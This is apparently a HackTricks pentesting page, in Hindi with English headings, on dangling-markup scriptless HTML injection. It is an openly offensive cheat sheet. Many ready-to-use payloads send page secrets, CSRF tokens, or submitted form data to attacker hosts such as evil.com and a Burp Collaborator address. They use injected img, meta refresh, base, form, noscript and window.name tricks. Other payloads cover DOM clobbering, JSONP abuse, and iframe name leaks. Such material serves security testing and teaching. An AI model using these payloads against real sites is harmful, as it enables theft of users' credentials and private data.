# Dangling Markup - HTML scriptless injection

{{#include ../../banners/hacktricks-training.md}}

## Resume

यह तकनीक तब उपयोग की जा सकती है जब **HTML injection पाया जाता है**। यह बहुत उपयोगी है यदि आप **कोई तरीका नहीं ढूंढ पाते** [**XSS** ](../xss-cross-site-scripting/)को शोषित करने के लिए लेकिन आप **कुछ HTML टैग्स** इंजेक्ट कर सकते हैं।\
यह तब भी उपयोगी है जब कुछ **गुप्त जानकारी स्पष्ट पाठ में** HTML में सहेजी गई हो और आप इसे **exfiltrate** करना चाहते हैं, या यदि आप कुछ स्क्रिप्ट निष्पादन को भटकाना चाहते हैं।

यहां कई तकनीकें टिप्पणी की गई हैं जिन्हें कुछ [**Content Security Policy**](../content-security-policy-csp-bypass/) को बायपास करने के लिए अप्रत्याशित तरीकों (html टैग्स, CSS, http-meta टैग्स, फॉर्म, बेस...) में जानकारी exfiltrate करने के लिए उपयोग किया जा सकता है।

## Main Applications

### Stealing clear text secrets

यदि आप `<img src='http://evil.com/log.cgi?` इंजेक्ट करते हैं जब पृष्ठ लोड होता है, तो पीड़ित आपको इंजेक्ट किए गए `img` टैग और कोड के भीतर अगले उद्धरण के बीच का सभी कोड भेज देगा। यदि किसी तरह उस टुकड़े में एक गुप्त जानकारी है, तो आप इसे चुरा लेंगे (आप एक डबल उद्धरण का उपयोग करके भी वही कर सकते हैं, देखें कि कौन सा उपयोग करना अधिक दिलचस्प हो सकता है)।

यदि `img` टैग निषिद्ध है (उदाहरण के लिए CSP के कारण) तो आप `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?` का भी उपयोग कर सकते हैं।
```html
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
ध्यान दें कि **Chrome HTTP URLs** को "<" या "\n" के साथ ब्लॉक करता है, इसलिए आप "ftp" जैसे अन्य प्रोटोकॉल स्कीमों को आजमा सकते हैं।

आप CSS `@import` का भी दुरुपयोग कर सकते हैं (यह सभी कोड को तब तक भेजेगा जब तक कि यह ";" नहीं ढूंढ ले
```html
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
आप **`<table`** का भी उपयोग कर सकते हैं:
```html
<table background='//your-collaborator-id.burpcollaborator.net?'
```
आप `<base` टैग भी डाल सकते हैं। सभी जानकारी तब तक भेजी जाएगी जब तक उद्धरण बंद नहीं हो जाता लेकिन इसके लिए कुछ उपयोगकर्ता इंटरैक्शन की आवश्यकता होती है (उपयोगकर्ता को किसी लिंक पर क्लिक करना होगा, क्योंकि बेस टैग ने लिंक द्वारा इंगित डोमेन को बदल दिया होगा):
```html
<base target='        <--- Injected
steal me'<b>test</b>
```
### फॉर्म चुराना
```html
<base href="http://evil.com/" />
```
फिर, जो फॉर्म डेटा को पथ पर भेजते हैं (जैसे `<form action='update_profile.php'>`) वे डेटा को दुर्भावनापूर्ण डोमेन पर भेजेंगे।

### फॉर्म चुराना 2

एक फॉर्म हेडर सेट करें: `<form action='http://evil.com/log_steal'>` यह अगले फॉर्म हेडर को ओवरराइट करेगा और फॉर्म से सभी डेटा हमलावर को भेजा जाएगा।

### फॉर्म चुराना 3

बटन URL को बदल सकता है जहाँ फॉर्म की जानकारी भेजी जाएगी "formaction" विशेषता के साथ:
```html
<button name="xss" type="submit" formaction="https://google.com">
I get consumed!
</button>
```
एक हमलावर इसका उपयोग जानकारी चुराने के लिए कर सकता है।

इस हमले का [**उदाहरण इस लेख में खोजें**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp).

### स्पष्ट पाठ रहस्यों को चुराना 2

उपरोक्त उल्लेखित तकनीक का उपयोग करके फॉर्म चुराने के लिए (एक नया फॉर्म हेडर इंजेक्ट करना) आप फिर एक नया इनपुट फ़ील्ड इंजेक्ट कर सकते हैं:
```html
<input type='hidden' name='review_body' value="
```
और यह इनपुट फ़ील्ड HTML में इसके डबल कोट के बीच और अगले डबल कोट के बीच सभी सामग्री को समाहित करेगा। यह हमला "_**स्पष्ट पाठ रहस्यों की चोरी**_" को "_**फार्म2 की चोरी**_" के साथ मिलाता है।

आप एक फ़ॉर्म और एक `<option>` टैग इंजेक्ट करके वही कर सकते हैं। सभी डेटा जब तक एक बंद `</option>` नहीं मिल जाता, भेजा जाएगा:
```html
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### फ़ॉर्म पैरामीटर इंजेक्शन

आप एक फ़ॉर्म का पथ बदल सकते हैं और नए मान डाल सकते हैं ताकि एक अप्रत्याशित क्रिया की जाएगी:
```html
<form action="/change_settings.php">
<input type="hidden" name="invite_user" value="fredmbogo" /> ← Injected lines

<form action="/change_settings.php">
← Existing form (ignored by the parser) ...
<input type="text" name="invite_user" value="" /> ← Subverted field ...
<input type="hidden" name="xsrf_token" value="12345" />
...
</form>
</form>
```
### स्पष्ट पाठ रहस्यों को noscript के माध्यम से चुराना

`<noscript></noscript>` एक टैग है जिसका सामग्री उस समय व्याख्यायित किया जाएगा जब ब्राउज़र जावास्क्रिप्ट का समर्थन नहीं करता है (आप [chrome://settings/content/javascript](chrome://settings/content/javascript) में Chrome में जावास्क्रिप्ट को सक्षम/अक्षम कर सकते हैं)।

एक तरीका है वेब पृष्ठ की सामग्री को इंजेक्शन के बिंदु से नीचे तक एक हमलावर द्वारा नियंत्रित साइट पर निकालने का, यह इंजेक्ट करना:
```html
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### उपयोगकर्ता इंटरैक्शन के साथ CSP को बायपास करना

इस [portswiggers शोध](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup) से आप सीख सकते हैं कि **सबसे अधिक CSP प्रतिबंधित** वातावरणों से भी आप कुछ **उपयोगकर्ता इंटरैक्शन** के साथ **डेटा निकाल** सकते हैं। इस अवसर पर हम पेलोड का उपयोग करने जा रहे हैं:
```html
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
ध्यान दें कि आप **शिकार** से **एक लिंक पर क्लिक करने** के लिए कहेंगे जो उसे **पेलोड** की ओर **रीडायरेक्ट** करेगा जिसे आप नियंत्रित करते हैं। यह भी ध्यान दें कि **`base`** टैग के अंदर **`target`** विशेषता में **HTML सामग्री** अगले एकल उद्धरण तक होगी।\
इससे यह होगा कि यदि लिंक पर क्लिक किया जाता है तो **`window.name`** का **मान** सभी **HTML सामग्री** होगा। इसलिए, चूंकि आप उस पृष्ठ को **नियंत्रित** करते हैं जिस पर शिकार लिंक पर क्लिक करके पहुंच रहा है, आप उस **`window.name`** तक पहुंच सकते हैं और उस डेटा को **एक्सफिल्ट्रेट** कर सकते हैं:
```html
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### Misleading script workflow 1 - HTML namespace attack

HTML के अंदर एक नया टैग डालें जिसमें एक आईडी हो जो अगले टैग को ओवरराइट करेगा और एक ऐसा मान होगा जो स्क्रिप्ट के प्रवाह को प्रभावित करेगा। इस उदाहरण में, आप यह चुन रहे हैं कि किसके साथ जानकारी साझा की जाएगी:
```html
<input type="hidden" id="share_with" value="fredmbogo" /> ← Injected markup ...
Share this status update with: ← Legitimate optional element of a dialog
<input id="share_with" value="" />

... function submit_status_update() { ... request.share_with =
document.getElementById('share_with').value; ... }
```
### Misleading script workflow 2 - Script namespace attack

जावास्क्रिप्ट नामस्थान के अंदर वेरिएबल बनाने के लिए HTML टैग्स डालें। फिर, यह वेरिएबल एप्लिकेशन के प्रवाह को प्रभावित करेगा:
```html
<img id="is_public" /> ← Injected markup ... // Legitimate application code
follows function retrieve_acls() { ... if (response.access_mode == AM_PUBLIC) ←
The subsequent assignment fails in IE is_public = true; else is_public = false;
} function submit_new_acls() { ... if (is_public) request.access_mode =
AM_PUBLIC; ← Condition always evaluates to true ... }
```
### JSONP का दुरुपयोग

यदि आप एक JSONP इंटरफ़ेस पाते हैं, तो आप मनमाने डेटा के साथ एक मनमानी फ़ंक्शन को कॉल करने में सक्षम हो सकते हैं:
```html
<script src='/editor/sharing.js'>:              ← Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    ← Injected JSONP call
set_sharing({ ... })
```
या आप कुछ जावास्क्रिप्ट चलाने की कोशिश भी कर सकते हैं:
```html
<script src="/search?q=a&call=alert(1)"></script>
```
### Iframe का दुरुपयोग

एक बाल दस्तावेज़ में अपने माता-पिता की `location` संपत्ति को देखने और संशोधित करने की क्षमता होती है, यहां तक कि क्रॉस-ओरिजिन स्थितियों में भी। यह एक **iframe** के भीतर एक स्क्रिप्ट को एम्बेड करने की अनुमति देता है जो क्लाइंट को किसी भी पृष्ठ पर पुनर्निर्देशित कर सकता है:
```html
<html>
<head></head>
<body>
<script>
top.window.location = "https://attacker.com/hacked.html"
</script>
</body>
</html>
```
इसका समाधान कुछ इस तरह किया जा सकता है: `sandbox=' allow-scripts allow-top-navigation'`

एक iframe का दुरुपयोग करके एक अलग पृष्ठ से संवेदनशील जानकारी को **iframes नाम विशेषता का उपयोग करके** लीक किया जा सकता है। इसका कारण यह है कि आप एक iframe बना सकते हैं जो स्वयं को iframe करता है, HTML इंजेक्शन का दुरुपयोग करते हुए जो **संवेदनशील जानकारी को iframe नाम विशेषता के अंदर प्रदर्शित करता है** और फिर उस नाम को प्रारंभिक iframe से एक्सेस करके लीक कर सकते हैं।
```html
<script>
function cspBypass(win) {
win[0].location = "about:blank"
setTimeout(() => alert(win[0].name), 500)
}
</script>

<iframe
src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27"
onload="cspBypass(this.contentWindow)"></iframe>
```
For more info check [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### \<meta abuse

आप **`meta http-equiv`** का उपयोग **कई क्रियाएँ** करने के लिए कर सकते हैं जैसे कि एक Cookie सेट करना: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` या एक रीडायरेक्ट करना (इस मामले में 5 सेकंड में): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

इससे **बचाव** किया जा सकता है एक **CSP** के साथ जो **http-equiv** को नियंत्रित करता है ( `Content-Security-Policy: default-src 'self';`, या `Content-Security-Policy: http-equiv 'self';`)

### New \<portal HTML tag

आप \<portal टैग की exploitable vulnerabilities पर एक बहुत **दिलचस्प शोध** [यहाँ](https://research.securitum.com/security-analysis-of-portal-element/) पा सकते हैं।\
इस लेखन के समय, आपको Chrome में `chrome://flags/#enable-portals` पर portal टैग सक्षम करना होगा या यह काम नहीं करेगा।
```html
<portal src='https://attacker-server?
```
### HTML Leaks

HTML में कनेक्टिविटी लीक करने के सभी तरीके Dangling Markup के लिए उपयोगी नहीं होंगे, लेकिन कभी-कभी यह मदद कर सकता है। इन्हें यहाँ चेक करें: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## SS-Leaks

यह **dangling markup और XS-Leaks** के बीच का एक **मिश्रण** है। एक तरफ, यह भेद्यता **HTML** (लेकिन JS नहीं) को **same origin** के एक पृष्ठ में **inject** करने की अनुमति देती है, जिसे हम हमलावर करेंगे। दूसरी तरफ, हम उस पृष्ठ पर **सीधे हमला** नहीं करेंगे जहाँ हम HTML inject कर सकते हैं, बल्कि **दूसरे पृष्ठ** पर।

{{#ref}}
ss-leaks.md
{{#endref}}

## XS-Search/XS-Leaks

XS-Search **cross-origin जानकारी** को **side channel attacks** का दुरुपयोग करके **exfiltrate** करने के लिए उन्मुख हैं। इसलिए, यह Dangling Markup से एक अलग तकनीक है, हालाँकि, कुछ तकनीकें HTML टैग्स (JS निष्पादन के साथ और बिना) के समावेश का दुरुपयोग करती हैं, जैसे [**CSS Injection**](../xs-search/#css-injection) या [**Lazy Load Images**](../xs-search/#image-lazy-loading)**.**

{{#ref}}
../xs-search/
{{#endref}}

## Brute-Force Detection List

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## References

- [https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057](https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057)
- [http://lcamtuf.coredump.cx/postxss/](http://lcamtuf.coredump.cx/postxss/)
- [http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)
- [https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

{{#include ../../banners/hacktricks-training.md}}
